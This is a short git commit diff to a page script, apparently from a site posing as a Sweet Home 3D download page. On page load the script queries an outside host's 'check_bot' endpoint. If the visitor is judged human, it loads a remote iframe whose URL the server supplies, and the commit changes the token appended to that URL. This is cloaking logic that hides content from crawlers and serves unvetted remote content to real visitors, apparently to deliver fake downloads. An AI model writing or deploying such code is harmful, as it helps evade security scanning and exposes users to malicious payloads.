36be78316d41b56e6ebdf0bd56a6c13c83a61ff2
sweethome3d-download <chillibilli033@gmail.com>
2025-04-17 20:55:45 +0300

    update

--- mainScript.js
+++ mainScript.js
@@ -55,7 +55,7 @@ window.addEventListener('message', (message) => {
 window.addEventListener('DOMContentLoaded', () => {
     fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
-            createFrame(res.url + 'myTg88HB')
+            createFrame(res.url + 'PgKzwT3K')
         } else {
             setTimeout(toggleLoad, 500);
 
